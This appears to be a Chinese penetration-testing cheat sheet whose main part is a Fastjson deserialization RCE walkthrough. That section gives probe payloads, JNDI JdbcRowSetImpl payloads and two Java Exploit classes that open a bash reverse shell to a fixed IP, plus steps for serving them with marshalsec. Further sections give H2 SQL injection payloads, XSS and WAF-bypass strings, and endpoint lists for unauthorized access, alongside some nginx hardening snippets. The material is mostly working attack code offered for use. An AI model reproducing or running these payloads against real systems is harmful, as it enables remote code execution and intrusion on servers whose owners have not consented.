******************
渗透测试
******************
渗透测试的技巧和工具。


fastjson专题
===============

.. tip:: 建议在Linux下操作，我再Windows上操作好久没复现出来，遇到很多坑，最后在Linux成功复现，后来检查貌似是编译的class文件有问题。系统版本：kali-2020.3  jdk版本：jdk-8u151-linux-x64.tar.gz


1. 检查和利用脚本（谨慎使用，测试结果存在泄露风险，毕竟调用的是别人的API）::
   `github <https://github.com/mrknow001/fastjson_rec_exploit.git>`_ 

2. 探测Fastjson::
   
.. code-block:: json

	{"rand1":{"@type":"java.net.InetAddress","val":"http://dnslog"}}

	{"rand2":{"@type":"java.net.Inet4Address","val":"http://dnslog"}}

	{"rand3":{"@type":"java.net.Inet6Address","val":"http://dnslog"}}

	{"rand4":{"@type":"java.net.InetSocketAddress"{"address":,"val":"http://dnslog"}}}

	{"rand5":{"@type":"java.net.URL","val":"http://dnslog"}}

	//一些畸形payload，不过依然可以触发dnslog：
	{"rand6":{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}}

	{"rand7":Set[{"@type":"java.net.URL","val":"http://dnslog"}]}

	{"rand8":Set[{"@type":"java.net.URL","val":"http://dnslog"}

	{"rand9":{"@type":"java.net.URL","val":"http://dnslog"}:0

参考链接： `Fastjson 反序列化漏洞史 <https://paper.seebug.org/1192/>`_ 

3. 无需开启AutoType::
   
.. code-block:: json

	{
	    "a":{
	        "@type":"java.lang.Class",
	        "val":"com.sun.rowset.JdbcRowSetImpl"
	    },
	    "b":{
	        "@type":"com.sun.rowset.JdbcRowSetImpl",
	        "dataSourceName":"rmi://172.20.16.121:8000/Exploit",
	        "autoCommit":true
	    }
	}

   
4. fastjson反弹shell

     a) 安装JDK8,编辑Exploit.java，编译成Exploit.class：javac Exploit.java。在Exploit.class文件目录下运行python服务器：python3 -m http.server 80（python2 -m SimpleHTTPServer 80）

反弹shell①::

	.. code-block:: java

	    import javax.naming.Context;
		import javax.naming.Name;
		import javax.naming.spi.ObjectFactory;
		import java.io.IOException;
		import java.util.Hashtable;
		 
		 
		public class Exploit{
		    public Exploit() {}
		 
		    static
		    {
		        try {
		            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
		                    ? new String[]{"cmd.exe","/c", "calc.exe"}
		                    : new String[]{"bash", "-c", "/bin/bash -i >&amp; /dev/tcp/172.20.16.121/8000 0>&amp;1"};
		                    //: new String[]{"bash", "-c", "/bin/bash -i >& /dev/tcp/172.20.16.121/8000 0>&1"};
		            Runtime.getRuntime().exec(cmds);
		        } catch (Exception e) {
		            e.printStackTrace();
		        }
		    }
		 
		    //public static void main(String[] args) {
		       // Exploit e = new Exploit();
		        //System.out.println("hello world");
		  //  }
		}
反弹shell②::

	.. code-block:: java
	
	    import javax.naming.Context;
		import javax.naming.Name;
		import javax.naming.spi.ObjectFactory;
		import java.io.IOException;
		import java.util.Hashtable;
		import java.net.InetAddress;
		 
		 
		public class Exploit{
		    public Exploit() {}
		 
		    static
		    {
		        try {
		            String[] cmds = new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/172.20.16.121/8000;cat <&5 | while read line; do $line 2>&5 >&5; done"};
		            //String[] cmds = new String[]{"/bin/sh","-c", "ping mytest.42e9vz.dnslog.cn"};
		        	Runtime.getRuntime().exec(cmds);
		        } catch (Exception e) {
		            e.printStackTrace();
		        }
		    }
		 
		//    public static void main(String[] args) {
		//        Exploit e = new Exploit();
		//        //System.out.println("hello world");
		//    }
		}
	 b) 安装Maven，git下载marshalsec，切换到pom文件目录下，打包构建：mvn clean package -DskipTests（具体可以查看READEME文件），打包后到target目录下找到jar包。
    
     c) 运行ldap或者rmi服务，端口7776。 http://172.20.16.121/#Exploit 为之前运行的python服务，IP换成自己的地址::  
        
        java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://172.20.134.239/#Exploit 7776
     d) burpsuite发送payload::
        
	       {
		    "name":{
		        "@type":"java.lang.Class",
		        "val":"com.sun.rowset.JdbcRowSetImpl"
		    },
		    "x":{
		        "@type":"com.sun.rowset.JdbcRowSetImpl",
		        "dataSourceName":"ldap://172.20.16.121:7776/Exploit",
		        "autoCommit":true
		    }
		}


参考链接： 

- `vulnhub <github.com/vulhub/vulhub>`_
- `fastjson漏洞复现 <https://saucer-man.com/information_security/346.html>`_  
- `Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType） <https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/>`_ 
- `cve-2019-14540-exploit <https://github.com/LeadroyaL/cve-2019-14540-exploit>`_
- `fastjson 反弹shell <https://www.cnblogs.com/mysticbinary/p/12788019.html>`_ 
- `marshalsec <https://github.com/mbechler/marshalsec>`_ 
- `fastjson-blacklist <https://github.com/LeadroyaL/fastjson-blacklist>`_ 
- `Fastjson 反序列化漏洞史 <https://paper.seebug.org/1192/>`_ 
- `ysoserial <https://github.com/frohoff/ysoserial>`_ 
- `Java-Deserialization-Cheat-Sheet <https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet>`_ 
- `fastjson漏洞复现 <https://saucer-man.com/information_security/346.html>`_ 
- `vulhub -- fastjson/1.2.24-rce <https://github.com/vulhub/vulhub/tvulnhub -- ree/master/fastjson/1.2.24-rce>`_ 
- `fastjson 1.2.47 rce <https://blog.th3wind.xyz/posts/1479992369.html>`_ 
- `Fastjson历史漏洞研究（一） <http://blog.topsec.com.cn/fastjson%e5%8e%86%e5%8f%b2%e6%bc%8f%e6%b4%9e%e7%a0%94%e7%a9%b6%ef%bc%88%e4%b8%80%ef%bc%89/>`_ 

爬虫代理池ysoserial
============

1. `github <https://github.com/jhao104/proxy_pool>`_ 

H2数据库盲注
============
1. 创建函数::

	method=pullmsg&udid=-2';CREATE ALIAS test AS $$ @CODE void sleeptest() throws Exception{ Thread.sleep(3000);}$$;--

2. 调用函数::

	method=pullmsg&udid=-1';select test();--

3. 命令执行::

	https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html

SQLmap
========
1.指定参数

JWT(Json Web Token)安全
=======================

1. jwt解析和生成网站::

	http://jwt.io
	
3. jwt secret破解::

	https://github.com/brendan-rius/c-jwt-cracker

关闭火狐浏览器网络检测
========================

在搜索地址栏输入about:config
搜索 network.captive-portal-service.enabled，并将值设为false


一句话payload
===============
一句话payload同时检查SQL注入、xss等漏洞::

	'"><svg onload=prompt(5);>{{7*7}} 

imperva绕过
===============
imperva WAF绕过payload

.. code-block:: js

	<a href=javas&Tab;cript:confirm(1) >  //--tab按键和空格等特殊字符
	<details open ontoggle=alert(1)>      //待确认，目前未能绕过
	<details open ontoggle=top['al'+'ert']('1')> //待确认，目前未能绕过


目录暴破
========

**dirb和dirbuster字典中如果存在以 # 号开头的需要做特殊处理**，以#开头的可能会被判断为注释，eg：http://examples.com/#/list

1. druid未授权访问
	- /druid/weburi.html
	- /druid/index.html
	- /swagger-ui.html#
2. Tomcat示例文件
	- /docs
	- /examples
3. Actuator端点未授权访问
	/dump 		显示线程转储（包括堆栈跟踪）
	/trace 		显示最后几条HTTP消息（可能包含会话标识符）
	/logfile 	输出日志文件的内容
	/shutdown	关闭应用程序
	/mappings	显示所有MVC控制器映射
	/env 		提供对配置环境的访问
	/restart 	重新启动应用程序

部分版本需要加上 **/actuator/** dump

4. 只接受GET/POST请求

.. code-block:: js

	if ($request_method !~* GET|POST) {
     	return 403;
	}

5. 确保网站没有被嵌入到别人的站点里面，从而避免 clickjacking 攻击::

	add_header X-Frame-Options "SAMEORIGIN";

6. 禁止其他站点访问您的资源::

	add_header Access-Control-Allow-Origin "SAMEORIGIN";

7. 在Web服务器防止Host头攻击::

	if ($http_Host !~* ^域名1$|^域名2$|^IP1:端口$)
  	{
  		return 403;
  	}


csrf
========

json csrf
-----------

1. POSTbody需要以JSON格式发送，而这种格式如果用HTML表单元素来构建的话会比较麻烦。

2. Content-Type头需要设置为application/json。设置自定义Header需要使用XMLHttpRequests，而它还会向服务器端发送OPTIONS预检请求，服务器不响应OPTIONS请求。


3. 需要注意的是，在原始的数据包里Content-Type的值是application/json，而以form去提交是没法设置enctype为application/json的，在这里设置为text/plain，那么如何设置Content-Type的值呢

4. 需要注意的是，该请求中的Content-Type头被设置成了application/x-www-form-urlencoded，因为服务器需要接收URL编码后的HTML表单数据。

5. 那我们为何不能使用这个PoC来利用JSON端点中的CSRF呢？原因如下：
   
   a) POSTbody需要以JSON格式发送，而这种格式如果用HTML表单元素来构建的话会比较麻烦。
   b) Content-Type头需要设置为application/json。设置自定义Header需要使用XMLHttpRequests，而它还会向服务器端发送OPTIONS预检请求。

6. 解决方案swf_jason_csrf
   
参考链接：`swf_json_csrf <https://github.com/sp1d3r/swf_json_csrf>`_ ::

	# GitHub下载部署
	https://github.com/sp1d3r/swf_json_csrf
	# 请求方式
	http://127.0.0.1/read.html?jsonData={%22roleId%22:8}&php_url=http://127.0.0.1/test.php&endpoint=https://flyhi.com/



参考链接::
	
	https://www.cnblogs.com/blacksunny/p/7930126.html
	https://www.freebuf.com/articles/web/164234.html